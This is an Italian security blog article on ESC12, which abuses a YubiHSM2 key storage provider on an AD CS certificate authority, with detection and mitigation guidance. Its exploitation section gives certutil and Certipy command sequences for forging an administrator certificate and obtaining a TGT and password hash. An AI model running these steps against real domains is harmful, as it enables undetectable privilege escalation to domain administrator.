---
title: 'ESC12 AD CS: Privesc tramite YubiHSM2 e Golden Certificates'
slug: esc12-adcs
description: 'ESC12 in AD CS riguarda l’abuso del YubiHSM2 KSP sulla CA Windows: privilege escalation in Active Directory e uso di Certipy dopo la compromissione locale.'
image: /12.webp
draft: false
date: 2026-03-09T00:00:00.000Z
categories:
  - windows
subcategories:
  - privilege-escalation
tags:
  - ESC12
  - AD CS
  - YubiHSM2
  - Golden Certificate
  - PKI Security
featured: false
---

# ESC12 in Active Directory Certificate Services: abuso della chiave CA protetta da YubiHSM2

ESC12 è diverso da tutte le altre tecniche ESC: non è una misconfigurazione di un certificate template o di una ACL su AD CS, ma un problema nel **modo in cui un dispositivo HSM (Hardware Security Module) viene usato dal server della CA**. La tecnica è stata documentata da Hans-Joachim Knobloch per i casi in cui la chiave privata della CA è protetta da un **YubiHSM2**.

Prima di andare avanti, un glossario — qui più che altrove serve, perché si entra in territorio hardware:

| Termine                                     | Cos'è, in una riga                                                                                                                                                                              |
| ------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **HSM** (Hardware Security Module)          | Un dispositivo fisico dedicato a generare e custodire chiavi crittografiche, pensato per non far mai uscire la chiave privata in chiaro dal dispositivo stesso.                                 |
| **YubiHSM2**                                | Un modello specifico di HSM USB prodotto da Yubico, usabile anche per proteggere la chiave privata di una Certificate Authority.                                                                |
| **KSP** (Key Storage Provider)              | Il componente software Windows (CNG) che fa da ponte tra un'applicazione (qui: il servizio CA) e il dispositivo che custodisce la chiave — in questo caso l'HSM.                                |
| **CNG** (Cryptography API: Next Generation) | L'infrastruttura crittografica moderna di Windows, di cui i KSP fanno parte.                                                                                                                    |
| **CA**                                      | Certificate Authority: il server che firma ed emette i certificati nel dominio.                                                                                                                 |
| **Golden Certificate**                      | Un certificato forgiato con la chiave privata (o l'uso della chiave) della CA stessa: valido per qualsiasi identità, perché firmato dalla stessa autorità che il dominio considera attendibile. |
| **certutil**                                | Tool nativo Windows per gestire certificati, store e provider crittografici — qui è lo strumento usato per l'exploitation, non Certipy.                                                         |
| **Tier-0**                                  | La classificazione (nel modello di Microsoft per AD) degli asset più critici del dominio — DC, CA e sistemi equivalenti — che richiedono il massimo livello di protezione.                      |

***

# In cosa consiste davvero il problema

**Primo chiarimento, il più importante:** ESC12 non significa che la chiave privata della CA venga estratta dall'HSM. Il punto dell'HSM è proprio impedirlo, e nello scenario tipico la chiave **resta dentro il dispositivo**. Il problema è che un processo con pochi privilegi sulla macchina della CA può riuscire a **far usare** quella chiave al KSP per firmare qualcosa che l'attaccante controlla, senza mai doverla estrarre.

Due debolezze specifiche rendono possibile questo abuso con il KSP YubiHSM:

**1. La password di autenticazione all'HSM è salvata in chiaro nel registro:**

```text
HKLM\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword
```

Chiunque possa leggere questa chiave di registro può usarla per autenticarsi contro un YubiHSM — anche uno sotto il proprio controllo, se riesce a farlo "vedere" al sistema giusto.

**2. Il KSP non verifica quale account Windows lo sta invocando.** Con una chiave software "normale", le ACL di default di solito richiedono privilegi di amministratore locale per usarla. Con questo KSP, invece, basta un accesso **locale senza privilegi amministrativi** per riuscire a invocare operazioni di firma tramite CNG.

Messe insieme: un attaccante con una shell non privilegiata sul server della CA, che riesce a leggere quella chiave di registro, può usare la chiave della CA per firmare certificati arbitrari — senza bisogno di diritti elevati e senza estrarre nulla dall'HSM.

> Per questo ESC12 è quasi sempre uno scenario **post-compromise**: presuppone di avere già una shell sul server CA, non è un punto d'ingresso.

***

# Exploitation tecnica

Questo è il punto dove molte guide sbagliano: lo sfruttamento reale **non passa per Certipy**, ma per i tool nativi Windows (`certutil`), perché è lì che avviene l'interazione con il KSP.

### Step 1 — Procurarsi il certificato pubblico della CA

Il certificato pubblico della CA non è un segreto, è distribuito nel dominio. Lo si importa nel proprio certificate store utente:

```cmd
certutil -addstore -user my <file del certificato CA>
```

### Step 2 — Associare la voce nello store alla chiave nell'HSM

```cmd
certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <Common Name della CA>
```

Questo comando usa il KSP per "agganciare" la chiave privata già presente nel YubiHSM a quella voce di certificato nello store dell'utente corrente — ed è il passaggio che funziona anche da un contesto non privilegiato, grazie alla debolezza descritta sopra.

### Step 3 — Forgiare un certificato arbitrario

```cmd
certutil -sign <template o richiesta> administrator_forged.cer
```

Da qui l'attaccante ottiene un certificato firmato con la chiave della CA, con i campi che preferisce (es. UPN `administrator@corp.local`), **senza che la chiave privata abbia mai lasciato l'HSM**.

### Step 4 — Autenticarsi con il certificato forgiato

Una volta ottenuto il certificato in un formato utilizzabile, l'autenticazione segue il percorso consueto:

```bash
certipy auth -pfx administrator_forged.pfx -dc-ip 10.0.0.100
```

Output atteso:

```
Got TGT
Saving credential cache to administrator.ccache
Got hash for administrator
```

***

# Scenario alternativo A: chiave realmente esportata

Tutto quanto sopra presuppone che la chiave **resti** nell'HSM e venga solo "usata". Se — per una ragione diversa, non per questa debolezza del KSP — la chiave privata della CA finisce davvero in un file `.pfx` utilizzabile fuori dall'HSM, allora sì, si può usare direttamente Certipy per forgiare certificati:

```bash
certipy forge \
-ca-pfx 'CORP-CA.pfx' \
-upn 'administrator@corp.local' \
-sid 'S-1-5-21-...-500' \
-crl 'ldap:///'
```

È importante non confondere i due scenari: questo richiede che la chiave sia **uscita** dall'HSM in un formato esportabile, cosa che l'HSM è progettato per impedire. È un caso distinto e meno comune, non il percorso "normale" di ESC12.

***

# Scenario alternativo B: HSM collegato via USB device server

Se lo YubiHSM2 non è collegato direttamente alla macchina CA ma tramite un **USB device server** (un dispositivo di rete che condivide porte USB), un attaccante con privilegi amministrativi su quel device server può provare a reindirizzare l'HSM verso la propria macchina, e usare la password letta dal registro per autenticarsi contro di esso da lì.

Il limite pratico di questo scenario: in molti prodotti, l'HSM non può essere collegato altrove finché resta connesso alla CA, oppure il servizio CA smette di funzionare quando l'HSM viene scollegato — un'interruzione che un monitoraggio dei servizi dovrebbe rilevare.

***

# Identificazione

Certipy **non rileva ESC12**: è uno scenario di sicurezza del sistema operativo e dell'HSM, non una misconfigurazione enumerabile via LDAP. L'identificazione passa per:

* verificare se la CA usa YubiHSM2 e con quale modello di KSP;
* controllare chi può leggere `HKLM\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` sul server CA;
* verificare chi ha accesso locale/remoto al server CA;
* se presente, verificare la sicurezza dell'eventuale USB device server.

Non tutti gli HSM sono interessati: alcuni modelli hanno un KSP che verifica l'account chiamante, e non sono vulnerabili a questo specifico abuso. ESC12 riguarda nello specifico lo stack YubiHSM2 descritto nella ricerca originale — non generalizzarlo automaticamente ad altri HSM senza verifica.

***

# L'aspetto più insidioso: la detection normale non basta

Un punto centrale della ricerca originale, spesso sottovalutato: i certificati forgiati con questo metodo **non passano dal normale flusso di emissione della CA**. Questo significa che:

* non compaiono nel database delle emissioni della CA;
* non generano i consueti eventi di log della CA (niente 4886/4887 di cui si parla per altre tecniche ESC);
* non attivano eventuali notifiche di emissione (es. via modulo SMTP).

Con un numero di serie scelto arbitrariamente, un certificato del genere **non può nemmeno essere revocato dalla CA** finché qualcuno non lo scopre e lo importa manualmente nel suo database. Monitorare solo i log "standard" di AD CS, quindi, non è sufficiente per questa tecnica.

| Fonte                | Cosa verificare                                                                                           |
| -------------------- | --------------------------------------------------------------------------------------------------------- |
| Accessi al server CA | Sessioni interattive, RDP o remote da account che non dovrebbero amministrare la PKI                      |
| Registro Windows     | Letture/accessi alla chiave `AuthKeysetPassword` sotto `HKLM\SOFTWARE\Yubico\YubiHSM`                     |
| KSP / YubiHSM        | Operazioni di firma o utilizzo della chiave da processi/contesti insoliti                                 |
| Infrastruttura USB   | Disconnessioni o reindirizzamenti dell'HSM, se collegato via USB device server                            |
| AD / Kerberos        | Autenticazioni con certificati che non corrispondono a nessuna emissione registrata nel database della CA |

Sono indicatori da correlare, non prove singole e definitive — le reali possibilità di monitoraggio dipendono dal modello di HSM e dai log effettivamente disponibili in quell'ambiente.

***

# Mitigation

La difesa non è "aggiornare il firmware" e basta — serve agire su più livelli:

* **Isolare il server CA come asset Tier-0**: solo gli amministratori PKI autorizzati dovrebbero potervi aprire una sessione, interattiva o remota. Un account di dominio qualsiasi non dovrebbe avvicinarsi a quella macchina senza una ragione documentata.
* **Proteggere la chiave di registro**: restringere le ACL di lettura su `HKLM\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` al solo account di sistema, e abilitare auditing su quella chiave dove supportato.
* **Proteggere l'infrastruttura USB**, se presente un device server: limitarne l'amministrazione e verificare che l'HSM non possa essere reindirizzato da utenti non autorizzati.
* **Mantenere aggiornato lo stack** (firmware, client, KSP) secondo le indicazioni del produttore — utile, ma da solo non elimina il problema strutturale del KSP che non verifica il chiamante.
* **Preparare una risposta a incidente specifica**: se si sospetta l'abuso, trattarlo come compromissione della PKI — cercare certificati non presenti nel database della CA, e pianificare revoca/sostituzione di certificati e chiavi coinvolte in base a cosa è stato realmente compromesso.

Il punto di fondo: un HSM protegge la chiave da **estrazione**, ma non rende automaticamente sicuro il sistema operativo da cui quella chiave viene usata. Il server CA va protetto con lo stesso livello di attenzione di un Domain Controller.

***

# Quando ESC12 non si applica

Vale la pena dirlo esplicitamente: questa tecnica **non** riguarda ogni CA, ogni HSM o ogni server AD CS. Si applica quando:

* la CA usa specificamente il **KSP YubiHSM2** descritto nella ricerca originale (altri HSM con KSP che verifica l'account chiamante non sono interessati nello stesso modo);
* l'attaccante ha già un accesso locale al server CA (ESC12 non è un vettore di accesso iniziale);
* la chiave di registro con la password dell'HSM è leggibile dal contesto dell'attaccante.

***

# FAQ — ESC12 ADCS

### Cos'è ESC12?

Un abuso della chiave privata della CA protetta da YubiHSM2, reso possibile da un KSP che non verifica l'account chiamante e da una password di autenticazione salvata in chiaro nel registro. La chiave resta nell'HSM, viene solo usata senza autorizzazione.

### ESC12 è una misconfigurazione AD CS come le altre?

No. È una debolezza del middleware KSP e della protezione del server CA, non del certificate template o delle ACL di AD CS.

### I certificati forgiati con ESC12 si possono revocare normalmente?

Spesso no, o non subito: se il certificato non è mai passato dal flusso di emissione della CA, non compare nel suo database e non può essere revocato finché non viene individuato e importato manualmente.

### Qual è la differenza tra ESC12 ed ESC5?

ESC5 riguarda ACL deboli su oggetti PKI (chi può modificare cosa in AD). ESC12 riguarda l'uso non autorizzato della chiave della CA tramite un HSM specifico — due superfici di attacco completamente diverse.

***

Ricerca originale di riferimento: [ESC12 — Shell Access to ADCS CA with YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm/). Per il quadro completo delle escalation AD CS vedi la [guida ESC1-ESC16](https://hackita.it/articoli/adcs-esc1-esc16/).

Tool usato per l'autenticazione finale: [Certipy](https://github.com/ly4k/Certipy).
